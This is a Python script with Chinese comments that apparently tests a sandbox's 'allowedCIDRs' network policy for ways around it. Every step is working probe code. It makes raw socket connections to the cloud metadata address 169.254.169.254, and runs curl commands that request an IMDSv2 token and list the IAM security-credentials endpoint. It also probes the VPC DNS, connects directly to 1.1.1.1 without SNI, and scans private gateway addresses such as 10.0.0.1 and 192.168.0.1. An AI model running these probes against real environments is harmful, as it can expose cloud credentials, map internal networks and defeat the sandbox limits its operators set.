# 实验D4: allowedCIDRs 直通攻击面
# policy: custom + allowedCIDRs=[169.254.169.254/32] (或测试用大范围)
# 1) 云元数据 169.254.169.254 可访问性
# 2) VPC DNS 172.31.0.2 (沙箱 resolv.conf 指向)
# 3) 无 SNI 直连 1.1.1.1 (CIDR 直通确认)
import socket, subprocess, time

def run(cmd, timeout=10):
    try:
        r = subprocess.run(["bash", "-c", cmd], capture_output=True, timeout=timeout)
        return r.stdout.decode(errors='replace') + r.stderr.decode(errors='replace')
    except Exception as e:
        return f"ERR {e}"

def probe(host, port, label, timeout=6):
    s = socket.socket(); s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((host, port))
        # 发送裸 HTTP 请求(无 TLS)
        s.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
        data = b''
        while len(data) < 1024:
            try:
                c = s.recv(4096)
            except socket.timeout:
                break
            if not c: break
            data += c
        return f"{label} {host}:{port} CONNECTED data={data[:60]!r} ({time.time()-t0:.2f}s)"
    except socket.timeout:
        return f"{label} {host}:{port} TIMEOUT"
    except ConnectionResetError:
        return f"{label} {host}:{port} RST"
    except Exception as e:
        return f"{label} {host}:{port} {type(e).__name__}:{e}"
    finally:
        s.close()

print("== [1] 云元数据 169.254.169.254 ==")
print(probe("169.254.169.254", 80, "IMDS"))
print(probe("169.254.169.254", 443, "IMDS-TLS"))

print("== [2] 元数据 IMDSv2 token 尝试 ==")
print(run("curl -s --max-time 5 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' | head -c 200; echo"))
print(run("curl -s --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -c 200; echo"))

print("== [3] VPC DNS 172.31.0.2 ==")
print(probe("172.31.0.2", 53, "VPC-DNS"))

print("== [4] 1.1.1.1 直连(无 SNI) ==")
print(probe("1.1.1.1", 80, "CF-HTTP"))
print(probe("1.1.1.1", 443, "CF-TLS-nosni"))

print("== [5] 内网网段探测 ==")
for ip in ["10.0.0.1", "172.16.0.1", "192.168.0.1", "100.64.0.1"]:
    print(probe(ip, 80, "LAN"))
